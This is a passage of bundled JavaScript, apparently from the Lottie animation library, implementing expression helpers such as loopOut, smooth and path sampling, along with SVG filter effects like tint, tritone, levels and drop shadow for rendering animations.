              }
              return ot;
            },
            a = function (s) {
              function tt(nt) {
                return nt === "Outline" ? tt.outlineInterface() : null;
              }
              return (tt._name = "Outline"), (tt.outlineInterface = i(s)), tt;
            };
          return function (o) {
            function s(tt) {
              return tt === "Data" ? s.dataInterface : null;
            }
            return (s._name = "Data"), (s.dataInterface = a(o)), s;
          };
        })(),
        interfaces = {
          layer: LayerExpressionInterface,
          effects: EffectsExpressionInterface,
          comp: CompExpressionInterface,
          shape: ShapeExpressionInterface,
          text: TextExpressionInterface,
          footage: FootageInterface,
        };
      function getInterface(i) {
        return interfaces[i] || null;
      }
      var expressionHelpers = (function () {
        function i(ot, st, ft) {
          st.x &&
            ((ft.k = !0),
            (ft.x = !0),
            (ft.initiateExpression = ExpressionManager.initiateExpression),
            ft.effectsSequence.push(
              ft.initiateExpression(ot, st, ft).bind(ft)
            ));
        }
        function a(ot) {
          return (
            (ot *= this.elem.globalData.frameRate),
            (ot -= this.offsetTime),
            ot !== this._cachingAtTime.lastFrame &&
              ((this._cachingAtTime.lastIndex =
                this._cachingAtTime.lastFrame < ot
                  ? this._cachingAtTime.lastIndex
                  : 0),
              (this._cachingAtTime.value = this.interpolateValue(
                ot,
                this._cachingAtTime
              )),
              (this._cachingAtTime.lastFrame = ot)),
            this._cachingAtTime.value
          );
        }
        function o(ot) {
          var st = -0.01,
            ft = this.getValueAtTime(ot),
            ht = this.getValueAtTime(ot + st),
            gt = 0;
          if (ft.length) {
            var St;
            for (St = 0; St < ft.length; St += 1)
              gt += Math.pow(ht[St] - ft[St], 2);
            gt = Math.sqrt(gt) * 100;
          } else gt = 0;
          return gt;
        }
        function s(ot) {
          if (this.vel !== void 0) return this.vel;
          var st = -0.001,
            ft = this.getValueAtTime(ot),
            ht = this.getValueAtTime(ot + st),
            gt;
          if (ft.length) {
            gt = createTypedArray("float32", ft.length);
            var St;
            for (St = 0; St < ft.length; St += 1)
              gt[St] = (ht[St] - ft[St]) / st;
          } else gt = (ht - ft) / st;
          return gt;
        }
        function tt() {
          return this.pv;
        }
        function nt(ot) {
          this.propertyGroup = ot;
        }
        return {
          searchExpressions: i,
          getSpeedAtTime: o,
          getVelocityAtTime: s,
          getValueAtTime: a,
          getStaticValueAtTime: tt,
          setGroupProperty: nt,
        };
      })();
      function addPropertyDecorator() {
        function i(vt, _t, Et) {
          if (!this.k || !this.keyframes) return this.pv;
          vt = vt ? vt.toLowerCase() : "";
          var Ct = this.comp.renderedFrame,
            Pt = this.keyframes,
            bt = Pt[Pt.length - 1].t;
          if (Ct <= bt) return this.pv;
          var xt, yt;
          Et
            ? (_t
                ? (xt = Math.abs(bt - this.elem.comp.globalData.frameRate * _t))
                : (xt = Math.max(0, bt - this.elem.data.ip)),
              (yt = bt - xt))
            : ((!_t || _t > Pt.length - 1) && (_t = Pt.length - 1),
              (yt = Pt[Pt.length - 1 - _t].t),
              (xt = bt - yt));
          var wt, $t, kt;
          if (vt === "pingpong") {
            var Rt = Math.floor((Ct - yt) / xt);
            if (Rt % 2 !== 0)
              return this.getValueAtTime(
                (xt - ((Ct - yt) % xt) + yt) / this.comp.globalData.frameRate,
                0
              );
          } else if (vt === "offset") {
            var It = this.getValueAtTime(
                yt / this.comp.globalData.frameRate,
                0
              ),
              Ot = this.getValueAtTime(bt / this.comp.globalData.frameRate, 0),
              Nt = this.getValueAtTime(
                (((Ct - yt) % xt) + yt) / this.comp.globalData.frameRate,
                0
              ),
              zt = Math.floor((Ct - yt) / xt);
            if (this.pv.length) {
              for (
                kt = new Array(It.length), $t = kt.length, wt = 0;
                wt < $t;
                wt += 1
              )
                kt[wt] = (Ot[wt] - It[wt]) * zt + Nt[wt];
              return kt;
            }
            return (Ot - It) * zt + Nt;
          } else if (vt === "continue") {
            var Bt = this.getValueAtTime(
                bt / this.comp.globalData.frameRate,
                0
              ),
              Wt = this.getValueAtTime(
                (bt - 0.001) / this.comp.globalData.frameRate,
                0
              );
            if (this.pv.length) {
              for (
                kt = new Array(Bt.length), $t = kt.length, wt = 0;
                wt < $t;
                wt += 1
              )
                kt[wt] =
                  Bt[wt] +
                  ((Bt[wt] - Wt[wt]) *
                    ((Ct - bt) / this.comp.globalData.frameRate)) /
                    5e-4;
              return kt;
            }
            return Bt + (Bt - Wt) * ((Ct - bt) / 0.001);
          }
          return this.getValueAtTime(
            (((Ct - yt) % xt) + yt) / this.comp.globalData.frameRate,
            0
          );
        }
        function a(vt, _t, Et) {
          if (!this.k) return this.pv;
          vt = vt ? vt.toLowerCase() : "";
          var Ct = this.comp.renderedFrame,
            Pt = this.keyframes,
            bt = Pt[0].t;
          if (Ct >= bt) return this.pv;
          var xt, yt;
          Et
            ? (_t
                ? (xt = Math.abs(this.elem.comp.globalData.frameRate * _t))
                : (xt = Math.max(0, this.elem.data.op - bt)),
              (yt = bt + xt))
            : ((!_t || _t > Pt.length - 1) && (_t = Pt.length - 1),
              (yt = Pt[_t].t),
              (xt = yt - bt));
          var wt, $t, kt;
          if (vt === "pingpong") {
            var Rt = Math.floor((bt - Ct) / xt);
            if (Rt % 2 === 0)
              return this.getValueAtTime(
                (((bt - Ct) % xt) + bt) / this.comp.globalData.frameRate,
                0
              );
          } else if (vt === "offset") {
            var It = this.getValueAtTime(
                bt / this.comp.globalData.frameRate,
                0
              ),
              Ot = this.getValueAtTime(yt / this.comp.globalData.frameRate, 0),
              Nt = this.getValueAtTime(
                (xt - ((bt - Ct) % xt) + bt) / this.comp.globalData.frameRate,
                0
              ),
              zt = Math.floor((bt - Ct) / xt) + 1;
            if (this.pv.length) {
              for (
                kt = new Array(It.length), $t = kt.length, wt = 0;
                wt < $t;
                wt += 1
              )
                kt[wt] = Nt[wt] - (Ot[wt] - It[wt]) * zt;
              return kt;
            }
            return Nt - (Ot - It) * zt;
          } else if (vt === "continue") {
            var Bt = this.getValueAtTime(
                bt / this.comp.globalData.frameRate,
                0
              ),
              Wt = this.getValueAtTime(
                (bt + 0.001) / this.comp.globalData.frameRate,
                0
              );
            if (this.pv.length) {
              for (
                kt = new Array(Bt.length), $t = kt.length, wt = 0;
                wt < $t;
                wt += 1
              )
                kt[wt] = Bt[wt] + ((Bt[wt] - Wt[wt]) * (bt - Ct)) / 0.001;
              return kt;
            }
            return Bt + ((Bt - Wt) * (bt - Ct)) / 0.001;
          }
          return this.getValueAtTime(
            (xt - (((bt - Ct) % xt) + bt)) / this.comp.globalData.frameRate,
            0
          );
        }
        function o(vt, _t) {
          if (!this.k) return this.pv;
          if (((vt = (vt || 0.4) * 0.5), (_t = Math.floor(_t || 5)), _t <= 1))
            return this.pv;
          var Et = this.comp.renderedFrame / this.comp.globalData.frameRate,
            Ct = Et - vt,
            Pt = Et + vt,
            bt = _t > 1 ? (Pt - Ct) / (_t - 1) : 1,
            xt = 0,
            yt = 0,
            wt;
          this.pv.length
            ? (wt = createTypedArray("float32", this.pv.length))
            : (wt = 0);
          for (var $t; xt < _t; ) {
            if ((($t = this.getValueAtTime(Ct + xt * bt)), this.pv.length))
              for (yt = 0; yt < this.pv.length; yt += 1) wt[yt] += $t[yt];
            else wt += $t;
            xt += 1;
          }
          if (this.pv.length)
            for (yt = 0; yt < this.pv.length; yt += 1) wt[yt] /= _t;
          else wt /= _t;
          return wt;
        }
        function s(vt) {
          this._transformCachingAtTime ||
            (this._transformCachingAtTime = { v: new Matrix() });
          var _t = this._transformCachingAtTime.v;
          if (
            (_t.cloneFromProps(this.pre.props), this.appliedTransformations < 1)
          ) {
            var Et = this.a.getValueAtTime(vt);
            _t.translate(
              -Et[0] * this.a.mult,
              -Et[1] * this.a.mult,
              Et[2] * this.a.mult
            );
          }
          if (this.appliedTransformations < 2) {
            var Ct = this.s.getValueAtTime(vt);
            _t.scale(
              Ct[0] * this.s.mult,
              Ct[1] * this.s.mult,
              Ct[2] * this.s.mult
            );
          }
          if (this.sk && this.appliedTransformations < 3) {
            var Pt = this.sk.getValueAtTime(vt),
              bt = this.sa.getValueAtTime(vt);
            _t.skewFromAxis(-Pt * this.sk.mult, bt * this.sa.mult);
          }
          if (this.r && this.appliedTransformations < 4) {
            var xt = this.r.getValueAtTime(vt);
            _t.rotate(-xt * this.r.mult);
          } else if (!this.r && this.appliedTransformations < 4) {
            var yt = this.rz.getValueAtTime(vt),
              wt = this.ry.getValueAtTime(vt),
              $t = this.rx.getValueAtTime(vt),
              kt = this.or.getValueAtTime(vt);
            _t.rotateZ(-yt * this.rz.mult)
              .rotateY(wt * this.ry.mult)
              .rotateX($t * this.rx.mult)
              .rotateZ(-kt[2] * this.or.mult)
              .rotateY(kt[1] * this.or.mult)
              .rotateX(kt[0] * this.or.mult);
          }
          if (this.data.p && this.data.p.s) {
            var Rt = this.px.getValueAtTime(vt),
              It = this.py.getValueAtTime(vt);
            if (this.data.p.z) {
              var Ot = this.pz.getValueAtTime(vt);
              _t.translate(
                Rt * this.px.mult,
                It * this.py.mult,
                -Ot * this.pz.mult
              );
            } else _t.translate(Rt * this.px.mult, It * this.py.mult, 0);
          } else {
            var Nt = this.p.getValueAtTime(vt);
            _t.translate(
              Nt[0] * this.p.mult,
              Nt[1] * this.p.mult,
              -Nt[2] * this.p.mult
            );
          }
          return _t;
        }
        function tt() {
          return this.v.clone(new Matrix());
        }
        var nt = TransformPropertyFactory.getTransformProperty;
        TransformPropertyFactory.getTransformProperty = function (vt, _t, Et) {
          var Ct = nt(vt, _t, Et);
          return (
            Ct.dynamicProperties.length
              ? (Ct.getValueAtTime = s.bind(Ct))
              : (Ct.getValueAtTime = tt.bind(Ct)),
            (Ct.setGroupProperty = expressionHelpers.setGroupProperty),
            Ct
          );
        };
        var ot = PropertyFactory.getProp;
        PropertyFactory.getProp = function (vt, _t, Et, Ct, Pt) {
          var bt = ot(vt, _t, Et, Ct, Pt);
          bt.kf
            ? (bt.getValueAtTime = expressionHelpers.getValueAtTime.bind(bt))
            : (bt.getValueAtTime =
                expressionHelpers.getStaticValueAtTime.bind(bt)),
            (bt.setGroupProperty = expressionHelpers.setGroupProperty),
            (bt.loopOut = i),
            (bt.loopIn = a),
            (bt.smooth = o),
            (bt.getVelocityAtTime =
              expressionHelpers.getVelocityAtTime.bind(bt)),
            (bt.getSpeedAtTime = expressionHelpers.getSpeedAtTime.bind(bt)),
            (bt.numKeys = _t.a === 1 ? _t.k.length : 0),
            (bt.propertyIndex = _t.ix);
          var xt = 0;
          return (
            Et !== 0 &&
              (xt = createTypedArray(
                "float32",
                _t.a === 1 ? _t.k[0].s.length : _t.k.length
              )),
            (bt._cachingAtTime = {
              lastFrame: initialDefaultFrame,
              lastIndex: 0,
              value: xt,
            }),
            expressionHelpers.searchExpressions(vt, _t, bt),
            bt.k && Pt.addDynamicProperty(bt),
            bt
          );
        };
        function st(vt) {
          return (
            this._cachingAtTime ||
              (this._cachingAtTime = {
                shapeValue: shapePool.clone(this.pv),
                lastIndex: 0,
                lastTime: initialDefaultFrame,
              }),
            (vt *= this.elem.globalData.frameRate),
            (vt -= this.offsetTime),
            vt !== this._cachingAtTime.lastTime &&
              ((this._cachingAtTime.lastIndex =
                this._cachingAtTime.lastTime < vt
                  ? this._caching.lastIndex
                  : 0),
              (this._cachingAtTime.lastTime = vt),
              this.interpolateShape(
                vt,
                this._cachingAtTime.shapeValue,
                this._cachingAtTime
              )),
            this._cachingAtTime.shapeValue
          );
        }
        var ft = ShapePropertyFactory.getConstructorFunction(),
          ht = ShapePropertyFactory.getKeyframedConstructorFunction();
        function gt() {}
        (gt.prototype = {
          vertices: function (_t, Et) {
            this.k && this.getValue();
            var Ct = this.v;
            Et !== void 0 && (Ct = this.getValueAtTime(Et, 0));
            var Pt,
              bt = Ct._length,
              xt = Ct[_t],
              yt = Ct.v,
              wt = createSizedArray(bt);
            for (Pt = 0; Pt < bt; Pt += 1)
              _t === "i" || _t === "o"
                ? (wt[Pt] = [xt[Pt][0] - yt[Pt][0], xt[Pt][1] - yt[Pt][1]])
                : (wt[Pt] = [xt[Pt][0], xt[Pt][1]]);
            return wt;
          },
          points: function (_t) {
            return this.vertices("v", _t);
          },
          inTangents: function (_t) {
            return this.vertices("i", _t);
          },
          outTangents: function (_t) {
            return this.vertices("o", _t);
          },
          isClosed: function () {
            return this.v.c;
          },
          pointOnPath: function (_t, Et) {
            var Ct = this.v;
            Et !== void 0 && (Ct = this.getValueAtTime(Et, 0)),
              this._segmentsLength ||
                (this._segmentsLength = bez.getSegmentsLength(Ct));
            for (
              var Pt = this._segmentsLength,
                bt = Pt.lengths,
                xt = Pt.totalLength * _t,
                yt = 0,
                wt = bt.length,
                $t = 0,
                kt;
              yt < wt;

            ) {
              if ($t + bt[yt].addedLength > xt) {
                var Rt = yt,
                  It = Ct.c && yt === wt - 1 ? 0 : yt + 1,
                  Ot = (xt - $t) / bt[yt].addedLength;
                kt = bez.getPointInSegment(
                  Ct.v[Rt],
                  Ct.v[It],
                  Ct.o[Rt],
                  Ct.i[It],
                  Ot,
                  bt[yt]
                );
                break;
              } else $t += bt[yt].addedLength;
              yt += 1;
            }
            return (
              kt ||
                (kt = Ct.c
                  ? [Ct.v[0][0], Ct.v[0][1]]
                  : [Ct.v[Ct._length - 1][0], Ct.v[Ct._length - 1][1]]),
              kt
            );
          },
          vectorOnPath: function (_t, Et, Ct) {
            _t == 1 ? (_t = this.v.c) : _t == 0 && (_t = 0.999);
            var Pt = this.pointOnPath(_t, Et),
              bt = this.pointOnPath(_t + 0.001, Et),
              xt = bt[0] - Pt[0],
              yt = bt[1] - Pt[1],
              wt = Math.sqrt(Math.pow(xt, 2) + Math.pow(yt, 2));
            if (wt === 0) return [0, 0];
            var $t =
              Ct === "tangent" ? [xt / wt, yt / wt] : [-yt / wt, xt / wt];
            return $t;
          },
          tangentOnPath: function (_t, Et) {
            return this.vectorOnPath(_t, Et, "tangent");
          },
          normalOnPath: function (_t, Et) {
            return this.vectorOnPath(_t, Et, "normal");
          },
          setGroupProperty: expressionHelpers.setGroupProperty,
          getValueAtTime: expressionHelpers.getStaticValueAtTime,
        }),
          extendPrototype([gt], ft),
          extendPrototype([gt], ht),
          (ht.prototype.getValueAtTime = st),
          (ht.prototype.initiateExpression =
            ExpressionManager.initiateExpression);
        var St = ShapePropertyFactory.getShapeProp;
        ShapePropertyFactory.getShapeProp = function (vt, _t, Et, Ct, Pt) {
          var bt = St(vt, _t, Et, Ct, Pt);
          return (
            (bt.propertyIndex = _t.ix),
            (bt.lock = !1),
            Et === 3
              ? expressionHelpers.searchExpressions(vt, _t.pt, bt)
              : Et === 4 && expressionHelpers.searchExpressions(vt, _t.ks, bt),
            bt.k && vt.addDynamicProperty(bt),
            bt
          );
        };
      }
      function initialize$1() {
        addPropertyDecorator();
      }
      function addDecorator() {
        function i() {
          return this.data.d.x
            ? ((this.calculateExpression =
                ExpressionManager.initiateExpression.bind(this)(
                  this.elem,
                  this.data.d,
                  this
                )),
              this.addEffect(this.getExpressionValue.bind(this)),
              !0)
            : null;
        }
        (TextProperty.prototype.getExpressionValue = function (a, o) {
          var s = this.calculateExpression(o);
          if (a.t !== s) {
            var tt = {};
            return (
              this.copyData(tt, a),
              (tt.t = s.toString()),
              (tt.__complete = !1),
              tt
            );
          }
          return a;
        }),
          (TextProperty.prototype.searchProperty = function () {
            var a = this.searchKeyframes(),
              o = this.searchExpressions();
            return (this.kf = a || o), this.kf;
          }),
          (TextProperty.prototype.searchExpressions = i);
      }
      function initialize() {
        addDecorator();
      }
      function SVGComposableEffect() {}
      SVGComposableEffect.prototype = {
        createMergeNode: function i(a, o) {
          var s = createNS("feMerge");
          s.setAttribute("result", a);
          var tt, nt;
          for (nt = 0; nt < o.length; nt += 1)
            (tt = createNS("feMergeNode")),
              tt.setAttribute("in", o[nt]),
              s.appendChild(tt),
              s.appendChild(tt);
          return s;
        },
      };
      var linearFilterValue =
        "0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0 0 0";
      function SVGTintFilter(i, a, o, s, tt) {
        this.filterManager = a;
        var nt = createNS("feColorMatrix");
        nt.setAttribute("type", "matrix"),
          nt.setAttribute("color-interpolation-filters", "linearRGB"),
          nt.setAttribute("values", linearFilterValue + " 1 0"),
          (this.linearFilter = nt),
          nt.setAttribute("result", s + "_tint_1"),
          i.appendChild(nt),
          (nt = createNS("feColorMatrix")),
          nt.setAttribute("type", "matrix"),
          nt.setAttribute("color-interpolation-filters", "sRGB"),
          nt.setAttribute("values", "1 0 0 0 0 0 1 0 0 0 0 0 1 0 0 0 0 0 1 0"),
          nt.setAttribute("result", s + "_tint_2"),
          i.appendChild(nt),
          (this.matrixFilter = nt);
        var ot = this.createMergeNode(s, [tt, s + "_tint_1", s + "_tint_2"]);
        i.appendChild(ot);
      }
      extendPrototype([SVGComposableEffect], SVGTintFilter),
        (SVGTintFilter.prototype.renderFrame = function (i) {
          if (i || this.filterManager._mdf) {
            var a = this.filterManager.effectElements[0].p.v,
              o = this.filterManager.effectElements[1].p.v,
              s = this.filterManager.effectElements[2].p.v / 100;
            this.linearFilter.setAttribute(
              "values",
              linearFilterValue + " " + s + " 0"
            ),
              this.matrixFilter.setAttribute(
                "values",
                o[0] -
                  a[0] +
                  " 0 0 0 " +
                  a[0] +
                  " " +
                  (o[1] - a[1]) +
                  " 0 0 0 " +
                  a[1] +
                  " " +
                  (o[2] - a[2]) +
                  " 0 0 0 " +
                  a[2] +
                  " 0 0 0 1 0"
              );
          }
        });
      function SVGFillFilter(i, a, o, s) {
        this.filterManager = a;
        var tt = createNS("feColorMatrix");
        tt.setAttribute("type", "matrix"),
          tt.setAttribute("color-interpolation-filters", "sRGB"),
          tt.setAttribute("values", "1 0 0 0 0 0 1 0 0 0 0 0 1 0 0 0 0 0 1 0"),
          tt.setAttribute("result", s),
          i.appendChild(tt),
          (this.matrixFilter = tt);
      }
      SVGFillFilter.prototype.renderFrame = function (i) {
        if (i || this.filterManager._mdf) {
          var a = this.filterManager.effectElements[2].p.v,
            o = this.filterManager.effectElements[6].p.v;
          this.matrixFilter.setAttribute(
            "values",
            "0 0 0 0 " +
              a[0] +
              " 0 0 0 0 " +
              a[1] +
              " 0 0 0 0 " +
              a[2] +
              " 0 0 0 " +
              o +
              " 0"
          );
        }
      };
      function SVGStrokeEffect(i, a, o) {
        (this.initialized = !1),
          (this.filterManager = a),
          (this.elem = o),
          (this.paths = []);
      }
      (SVGStrokeEffect.prototype.initialize = function () {
        var i =
            this.elem.layerElement.children ||
            this.elem.layerElement.childNodes,
          a,
          o,
          s,
          tt;
        for (
          this.filterManager.effectElements[1].p.v === 1
            ? ((tt = this.elem.maskManager.masksProperties.length), (s = 0))
            : ((s = this.filterManager.effectElements[0].p.v - 1),
              (tt = s + 1)),
            o = createNS("g"),
            o.setAttribute("fill", "none"),
            o.setAttribute("stroke-linecap", "round"),
            o.setAttribute("stroke-dashoffset", 1),
            s;
          s < tt;
          s += 1
        )
          (a = createNS("path")),
            o.appendChild(a),
            this.paths.push({ p: a, m: s });
        if (this.filterManager.effectElements[10].p.v === 3) {
          var nt = createNS("mask"),
            ot = createElementID();
          nt.setAttribute("id", ot),
            nt.setAttribute("mask-type", "alpha"),
            nt.appendChild(o),
            this.elem.globalData.defs.appendChild(nt);
          var st = createNS("g");
          for (
            st.setAttribute(
              "mask",
              "url(" + getLocationHref() + "#" + ot + ")"
            );
            i[0];

          )
            st.appendChild(i[0]);
          this.elem.layerElement.appendChild(st),
            (this.masker = nt),
            o.setAttribute("stroke", "#fff");
        } else if (
          this.filterManager.effectElements[10].p.v === 1 ||
          this.filterManager.effectElements[10].p.v === 2
        ) {
          if (this.filterManager.effectElements[10].p.v === 2)
            for (
              i =
                this.elem.layerElement.children ||
                this.elem.layerElement.childNodes;
              i.length;

            )
              this.elem.layerElement.removeChild(i[0]);
          this.elem.layerElement.appendChild(o),
            this.elem.layerElement.removeAttribute("mask"),
            o.setAttribute("stroke", "#fff");
        }
        (this.initialized = !0), (this.pathMasker = o);
      }),
        (SVGStrokeEffect.prototype.renderFrame = function (i) {
          this.initialized || this.initialize();
          var a,
            o = this.paths.length,
            s,
            tt;
          for (a = 0; a < o; a += 1)
            if (
              this.paths[a].m !== -1 &&
              ((s = this.elem.maskManager.viewData[this.paths[a].m]),
              (tt = this.paths[a].p),
              (i || this.filterManager._mdf || s.prop._mdf) &&
                tt.setAttribute("d", s.lastPath),
              i ||
                this.filterManager.effectElements[9].p._mdf ||
                this.filterManager.effectElements[4].p._mdf ||
                this.filterManager.effectElements[7].p._mdf ||
                this.filterManager.effectElements[8].p._mdf ||
                s.prop._mdf)
            ) {
              var nt;
              if (
                this.filterManager.effectElements[7].p.v !== 0 ||
                this.filterManager.effectElements[8].p.v !== 100
              ) {
                var ot =
                    Math.min(
                      this.filterManager.effectElements[7].p.v,
                      this.filterManager.effectElements[8].p.v
                    ) * 0.01,
                  st =
                    Math.max(
                      this.filterManager.effectElements[7].p.v,
                      this.filterManager.effectElements[8].p.v
                    ) * 0.01,
                  ft = tt.getTotalLength();
                nt = "0 0 0 " + ft * ot + " ";
                var ht = ft * (st - ot),
                  gt =
                    1 +
                    this.filterManager.effectElements[4].p.v *
                      2 *
                      this.filterManager.effectElements[9].p.v *
                      0.01,
                  St = Math.floor(ht / gt),
                  vt;
                for (vt = 0; vt < St; vt += 1)
                  nt +=
                    "1 " +
                    this.filterManager.effectElements[4].p.v *
                      2 *
                      this.filterManager.effectElements[9].p.v *
                      0.01 +
                    " ";
                nt += "0 " + ft * 10 + " 0 0";
              } else
                nt =
                  "1 " +
                  this.filterManager.effectElements[4].p.v *
                    2 *
                    this.filterManager.effectElements[9].p.v *
                    0.01;
              tt.setAttribute("stroke-dasharray", nt);
            }
          if (
            ((i || this.filterManager.effectElements[4].p._mdf) &&
              this.pathMasker.setAttribute(
                "stroke-width",
                this.filterManager.effectElements[4].p.v * 2
              ),
            (i || this.filterManager.effectElements[6].p._mdf) &&
              this.pathMasker.setAttribute(
                "opacity",
                this.filterManager.effectElements[6].p.v
              ),
            (this.filterManager.effectElements[10].p.v === 1 ||
              this.filterManager.effectElements[10].p.v === 2) &&
              (i || this.filterManager.effectElements[3].p._mdf))
          ) {
            var _t = this.filterManager.effectElements[3].p.v;
            this.pathMasker.setAttribute(
              "stroke",
              "rgb(" +
                bmFloor(_t[0] * 255) +
                "," +
                bmFloor(_t[1] * 255) +
                "," +
                bmFloor(_t[2] * 255) +
                ")"
            );
          }
        });
      function SVGTritoneFilter(i, a, o, s) {
        this.filterManager = a;
        var tt = createNS("feColorMatrix");
        tt.setAttribute("type", "matrix"),
          tt.setAttribute("color-interpolation-filters", "linearRGB"),
          tt.setAttribute(
            "values",
            "0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0 0 0 1 0"
          ),
          i.appendChild(tt);
        var nt = createNS("feComponentTransfer");
        nt.setAttribute("color-interpolation-filters", "sRGB"),
          nt.setAttribute("result", s),
          (this.matrixFilter = nt);
        var ot = createNS("feFuncR");
        ot.setAttribute("type", "table"),
          nt.appendChild(ot),
          (this.feFuncR = ot);
        var st = createNS("feFuncG");
        st.setAttribute("type", "table"),
          nt.appendChild(st),
          (this.feFuncG = st);
        var ft = createNS("feFuncB");
        ft.setAttribute("type", "table"),
          nt.appendChild(ft),
          (this.feFuncB = ft),
          i.appendChild(nt);
      }
      SVGTritoneFilter.prototype.renderFrame = function (i) {
        if (i || this.filterManager._mdf) {
          var a = this.filterManager.effectElements[0].p.v,
            o = this.filterManager.effectElements[1].p.v,
            s = this.filterManager.effectElements[2].p.v,
            tt = s[0] + " " + o[0] + " " + a[0],
            nt = s[1] + " " + o[1] + " " + a[1],
            ot = s[2] + " " + o[2] + " " + a[2];
          this.feFuncR.setAttribute("tableValues", tt),
            this.feFuncG.setAttribute("tableValues", nt),
            this.feFuncB.setAttribute("tableValues", ot);
        }
      };
      function SVGProLevelsFilter(i, a, o, s) {
        this.filterManager = a;
        var tt = this.filterManager.effectElements,
          nt = createNS("feComponentTransfer");
        (tt[10].p.k ||
          tt[10].p.v !== 0 ||
          tt[11].p.k ||
          tt[11].p.v !== 1 ||
          tt[12].p.k ||
          tt[12].p.v !== 1 ||
          tt[13].p.k ||
          tt[13].p.v !== 0 ||
          tt[14].p.k ||
          tt[14].p.v !== 1) &&
          (this.feFuncR = this.createFeFunc("feFuncR", nt)),
          (tt[17].p.k ||
            tt[17].p.v !== 0 ||
            tt[18].p.k ||
            tt[18].p.v !== 1 ||
            tt[19].p.k ||
            tt[19].p.v !== 1 ||
            tt[20].p.k ||
            tt[20].p.v !== 0 ||
            tt[21].p.k ||
            tt[21].p.v !== 1) &&
            (this.feFuncG = this.createFeFunc("feFuncG", nt)),
          (tt[24].p.k ||
            tt[24].p.v !== 0 ||
            tt[25].p.k ||
            tt[25].p.v !== 1 ||
            tt[26].p.k ||
            tt[26].p.v !== 1 ||
            tt[27].p.k ||
            tt[27].p.v !== 0 ||
            tt[28].p.k ||
            tt[28].p.v !== 1) &&
            (this.feFuncB = this.createFeFunc("feFuncB", nt)),
          (tt[31].p.k ||
            tt[31].p.v !== 0 ||
            tt[32].p.k ||
            tt[32].p.v !== 1 ||
            tt[33].p.k ||
            tt[33].p.v !== 1 ||
            tt[34].p.k ||
            tt[34].p.v !== 0 ||
            tt[35].p.k ||
            tt[35].p.v !== 1) &&
            (this.feFuncA = this.createFeFunc("feFuncA", nt)),
          (this.feFuncR || this.feFuncG || this.feFuncB || this.feFuncA) &&
            (nt.setAttribute("color-interpolation-filters", "sRGB"),
            i.appendChild(nt)),
          (tt[3].p.k ||
            tt[3].p.v !== 0 ||
            tt[4].p.k ||
            tt[4].p.v !== 1 ||
            tt[5].p.k ||
            tt[5].p.v !== 1 ||
            tt[6].p.k ||
            tt[6].p.v !== 0 ||
            tt[7].p.k ||
            tt[7].p.v !== 1) &&
            ((nt = createNS("feComponentTransfer")),
            nt.setAttribute("color-interpolation-filters", "sRGB"),
            nt.setAttribute("result", s),
            i.appendChild(nt),
            (this.feFuncRComposed = this.createFeFunc("feFuncR", nt)),
            (this.feFuncGComposed = this.createFeFunc("feFuncG", nt)),
            (this.feFuncBComposed = this.createFeFunc("feFuncB", nt)));
      }
      (SVGProLevelsFilter.prototype.createFeFunc = function (i, a) {
        var o = createNS(i);
        return o.setAttribute("type", "table"), a.appendChild(o), o;
      }),
        (SVGProLevelsFilter.prototype.getTableValue = function (
          i,
          a,
          o,
          s,
          tt
        ) {
          for (
            var nt = 0,
              ot = 256,
              st,
              ft = Math.min(i, a),
              ht = Math.max(i, a),
              gt = Array.call(null, { length: ot }),
              St,
              vt = 0,
              _t = tt - s,
              Et = a - i;
            nt <= 256;

          )
            (st = nt / 256),
              st <= ft
                ? (St = Et < 0 ? tt : s)
                : st >= ht
                ? (St = Et < 0 ? s : tt)
                : (St = s + _t * Math.pow((st - i) / Et, 1 / o)),
              (gt[vt] = St),
              (vt += 1),
              (nt += 256 / (ot - 1));
          return gt.join(" ");
        }),
        (SVGProLevelsFilter.prototype.renderFrame = function (i) {
          if (i || this.filterManager._mdf) {
            var a,
              o = this.filterManager.effectElements;
            this.feFuncRComposed &&
              (i ||
                o[3].p._mdf ||
                o[4].p._mdf ||
                o[5].p._mdf ||
                o[6].p._mdf ||
                o[7].p._mdf) &&
              ((a = this.getTableValue(
                o[3].p.v,
                o[4].p.v,
                o[5].p.v,
                o[6].p.v,
                o[7].p.v
              )),
              this.feFuncRComposed.setAttribute("tableValues", a),
              this.feFuncGComposed.setAttribute("tableValues", a),
              this.feFuncBComposed.setAttribute("tableValues", a)),
              this.feFuncR &&
                (i ||
                  o[10].p._mdf ||
                  o[11].p._mdf ||
                  o[12].p._mdf ||
                  o[13].p._mdf ||
                  o[14].p._mdf) &&
                ((a = this.getTableValue(
                  o[10].p.v,
                  o[11].p.v,
                  o[12].p.v,
                  o[13].p.v,
                  o[14].p.v
                )),
                this.feFuncR.setAttribute("tableValues", a)),
              this.feFuncG &&
                (i ||
                  o[17].p._mdf ||
                  o[18].p._mdf ||
                  o[19].p._mdf ||
                  o[20].p._mdf ||
                  o[21].p._mdf) &&
                ((a = this.getTableValue(
                  o[17].p.v,
                  o[18].p.v,
                  o[19].p.v,
                  o[20].p.v,
                  o[21].p.v
                )),
                this.feFuncG.setAttribute("tableValues", a)),
              this.feFuncB &&
                (i ||
                  o[24].p._mdf ||
                  o[25].p._mdf ||
                  o[26].p._mdf ||
                  o[27].p._mdf ||
                  o[28].p._mdf) &&
                ((a = this.getTableValue(
                  o[24].p.v,
                  o[25].p.v,
                  o[26].p.v,
                  o[27].p.v,
                  o[28].p.v
                )),
                this.feFuncB.setAttribute("tableValues", a)),
              this.feFuncA &&
                (i ||
                  o[31].p._mdf ||
                  o[32].p._mdf ||
                  o[33].p._mdf ||
                  o[34].p._mdf ||
                  o[35].p._mdf) &&
                ((a = this.getTableValue(
                  o[31].p.v,
                  o[32].p.v,
                  o[33].p.v,
                  o[34].p.v,
                  o[35].p.v
                )),
                this.feFuncA.setAttribute("tableValues", a));
          }
        });
      function SVGDropShadowEffect(i, a, o, s, tt) {
        var nt = a.container.globalData.renderConfig.filterSize,
          ot = a.data.fs || nt;
        i.setAttribute("x", ot.x || nt.x),
          i.setAttribute("y", ot.y || nt.y),
          i.setAttribute("width", ot.width || nt.width),
          i.setAttribute("height", ot.height || nt.height),
          (this.filterManager = a);
        var st = createNS("feGaussianBlur");
        st.setAttribute("in", "SourceAlpha"),
          st.setAttribute("result", s + "_drop_shadow_1"),
          st.setAttribute("stdDeviation", "0"),
          (this.feGaussianBlur = st),
          i.appendChild(st);
        var ft = createNS("feOffset");
        ft.setAttribute("dx", "25"),
          ft.setAttribute("dy", "0"),
